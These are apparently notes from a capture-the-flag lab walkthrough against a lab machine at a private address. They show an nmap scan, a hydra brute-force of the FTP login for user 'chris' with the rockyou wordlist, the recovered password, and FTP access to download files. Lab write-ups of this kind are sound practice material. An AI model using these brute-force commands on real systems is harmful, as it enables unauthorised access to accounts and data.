IP = 10.10.54.45

nmap scan
```bash
❯ nmap -A -sV 10.10.54.45 | tee nmap_scan.txt
```
Use agent C

Brute Force FTP using hydra
```bash
❯ hydra -l chris -P /usr/share/wordlists/rockyou.txt ftp://10.10.54.45
[ftp] host: 10.10.54.45   login: chris   password: crystal
```
ftp access
```bash
❯ ftp chris@10.10.54.45
```
get all the files

